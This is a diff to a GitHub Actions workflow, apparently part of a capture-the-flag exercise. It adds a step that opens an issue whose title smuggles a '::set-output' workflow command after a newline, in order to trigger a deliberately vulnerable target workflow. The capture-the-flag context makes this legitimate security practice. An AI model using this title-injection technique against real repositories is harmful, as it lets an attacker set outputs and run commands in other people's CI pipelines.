@@ -11,7 +11,16 @@ jobs:
           # On peut directement écrire dans $GITHUB_ENV pour définir COMMAND
           echo 'COMMAND=gh status' >> $GITHUB_ENV
            echo 'ALLOWED_STRINGS=("krimdaouas-design")' >> $GITHUB_ENV
-      - name: Trigger vulnerable workflow
-        run: |
-          # On peut utiliser l'API pour créer une issue ou déclencher l'autre workflow
-          echo "Créer l'issue ou appeler le workflow vulnérable ici"
+      - name: Create issue to trigger target workflow
+        uses: actions/github-script@v6
+        with:
+          script: |
+            const title = `Prepare me\n::set-output name=command::gh status`;
+            const body  = "CTF helper: created issue to trigger vulnerable workflow";
+            await github.rest.issues.create({
+              owner: context.repo.owner,
+              repo: context.repo.repo,
+              title,
+              body,
+            });
+
